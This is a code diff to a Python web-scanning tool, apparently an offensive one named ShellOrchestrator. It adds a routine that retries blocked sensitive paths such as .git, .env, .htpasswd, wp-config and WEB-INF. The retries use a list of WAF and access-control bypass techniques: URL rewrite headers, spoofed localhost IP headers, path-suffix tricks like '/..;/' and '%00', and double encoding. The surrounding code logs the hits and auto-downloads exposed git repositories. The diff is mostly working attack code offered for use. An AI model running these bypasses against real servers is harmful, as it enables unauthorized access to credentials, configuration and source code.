@@ -734,6 +734,7 @@ class ShellOrchestrator:
         verbose = self.config.get("verbose", False)
 
         raw_responses = []
+        blocked_paths = []
         for path in wordlist:
             try:
                 url = f"{base}/{path}"
@@ -742,9 +743,15 @@ class ShellOrchestrator:
                     allow_redirects=False, headers=headers,
                 )
                 raw_responses.append((path, url, resp))
+                if resp.status_code in (403, 404):
+                    blocked_paths.append((path, url, resp))
                 time.sleep(delay * 0.3)
             except Exception:
                 pass
+
+        if blocked_paths:
+            bypass_hits = self._url_rewrite_bypass(blocked_paths, base, headers, delay, verbose)
+            raw_responses.extend(bypass_hits)
 
         catchall_sig = _detect_catchall(raw_responses)
         if catchall_sig:
@@ -781,6 +788,7 @@ class ShellOrchestrator:
             finding_type = result["type"]
             evidence = result.get("evidence", "")
             sev = result.get("severity", "medium")
+            bypass_method = getattr(resp, '_bypass_method', None)
             entry = {
                 "path": path,
                 "status": status,
@@ -789,17 +797,21 @@ class ShellOrchestrator:
                 "finding_type": finding_type,
                 "evidence": evidence[:200],
             }
+            if bypass_method:
+                entry["bypass"] = bypass_method
+                evidence = f"[BYPASS: {bypass_method}] {evidence}"
 
             self._add_finding({
-                "name": f"Sensitive path: {path}",
+                "name": f"Sensitive path: {path}" + (f" (via {bypass_method})" if bypass_method else ""),
                 "severity": sev,
                 "affects": url,
-                "details": f"Status {status}, Size {size}B, Type: {finding_type}",
+                "details": f"Status {status}, Size {size}B, Type: {finding_type}" + (f", Bypass: {bypass_method}" if bypass_method else ""),
                 "evidence": evidence[:500],
                 "phase": "DirEnum",
                 "timestamp": time.strftime("%Y-%m-%dT%H:%M:%SZ"),
             })
-            print(f"    {C.sev_color(sev.upper())}[!] [{sev.upper()}]{C.RST} {path} ({status}, {size}B) - {finding_type}")
+            bypass_tag = f" {C.BYLW}[BYPASS:{bypass_method}]{C.RST}" if bypass_method else ""
+            print(f"    {C.sev_color(sev.upper())}[!] [{sev.upper()}]{C.RST} {path} ({status}, {size}B) - {finding_type}{bypass_tag}")
             if evidence and verbose:
                 print(f"      {C.dim('Evidence: ' + evidence[:120])}")
             found.append(entry)
@@ -816,6 +828,71 @@ class ShellOrchestrator:
             self._git_dump(base, headers, delay)
 
         return found
+
+    def _url_rewrite_bypass(self, blocked_paths, base, headers, delay, verbose):
+        import requests
+        hits = []
+        sensitive_blocked = []
+        for path, url, resp in blocked_paths:
+            validator = _resolve_validator(path)
+            if validator or any(path.lower().startswith(p) for p in (
+                ".git", ".env", ".svn", ".htpasswd", "web.config",
+                "wp-config", "server-status", "server-info",
+                "actuator", "swagger", "WEB-INF", "META-INF",
+            )):
+                sensitive_blocked.append((path, url, resp))
+
+        if not sensitive_blocked:
+            return hits
+
+        print(f"    {C.info('[BYPASS]')} Testing {len(sensitive_blocked)} blocked paths with URL rewrite headers")
+
+        for path, orig_url, orig_resp in sensitive_blocked:
+            bypassed = False
+            for technique in _URL_REWRITE_TECHNIQUES:
+                if bypassed:
+                    break
+                try:
+                    bypass_headers = dict(headers)
+                    method = technique["name"]
+                    ttype = technique["type"]
+                    if ttype == "header_rewrite":
+                        bypass_headers[technique["header"]] = f"/{path}"
+                        probe_url = f"{base}/"
+                    elif ttype == "header_ip":
+                        bypass_headers[technique["header"]] = technique["value"]
+                        probe_url = f"{base}/{path}"
+                    elif ttype == "path_suffix":
+                        probe_url = f"{base}/{path}{technique['suffix']}"
+                    elif ttype == "double_encode":
+                        encoded = path.replace("/", "%252f")
+                        probe_url = f"{base}/{encoded}"
+                    else:
+                        continue
+
+                    resp = requests.get(
+                        probe_url, timeout=8, verify=False,
+                        allow_redirects=False, headers=bypass_headers,
+                    )
+                    time.sleep(delay * 0.3)
+
+                    if resp.status_code == 200 and len(resp.content) > 0:
+                        if orig_resp.status_code != 200 or len(resp.content) != len(orig_resp.content):
+                            resp._bypass_method = method
+                            hits.append((path, orig_url, resp))
+                            bypassed = True
+                            if verbose:
+                                print(f"      {C.BYLW}[HIT]{C.RST} {path} bypassed via {method} ({resp.status_code}, {len(resp.content)}B)")
+                except Exception:
+                    pass
+
+        if hits:
+            print(f"    {C.warn('[BYPASS]')} {C.bold(str(len(hits)))} paths bypassed WAF/proxy restrictions")
+        else:
+            if verbose:
+                print(f"    {C.dim('[BYPASS] No bypasses found')}")
+
+        return hits
 
     def _git_dump(self, base_url, headers, delay):
         """Auto-download exposed .git repository when confirmed."""
@@ -2047,6 +2124,27 @@ def _build_stack_wordlist(server_info, detected_techs):
             seen.add(p)
             unique.append(p)
     return unique
+
+
+_URL_REWRITE_TECHNIQUES = [
+    # URL rewrite headers — proxy/WAF treats header as the real path
+    {"name": "X-Original-URL", "type": "header_rewrite", "header": "X-Original-URL"},
+    {"name": "X-Rewrite-URL", "type": "header_rewrite", "header": "X-Rewrite-URL"},
+    # IP spoofing headers — bypass IP-based ACL
+    {"name": "X-Forwarded-For", "type": "header_ip", "header": "X-Forwarded-For", "value": "127.0.0.1"},
+    {"name": "X-Real-IP", "type": "header_ip", "header": "X-Real-IP", "value": "127.0.0.1"},
+    {"name": "X-Custom-IP-Authorization", "type": "header_ip", "header": "X-Custom-IP-Authorization", "value": "127.0.0.1"},
+    {"name": "X-Originating-IP", "type": "header_ip", "header": "X-Originating-IP", "value": "127.0.0.1"},
+    # Path manipulation
+    {"name": "path-dot-segment", "type": "path_suffix", "suffix": "/..;/"},
+    {"name": "path-trailing-dot", "type": "path_suffix", "suffix": "."},
+    {"name": "path-trailing-slash", "type": "path_suffix", "suffix": "/"},
+    {"name": "path-semicolon", "type": "path_suffix", "suffix": ";"},
+    {"name": "path-null-byte", "type": "path_suffix", "suffix": "%00"},
+    {"name": "path-question", "type": "path_suffix", "suffix": "?"},
+    {"name": "path-hash-bypass", "type": "path_suffix", "suffix": "%23"},
+    {"name": "double-encode", "type": "double_encode"},
+]
 
 
 def _detect_catchall(raw_responses):
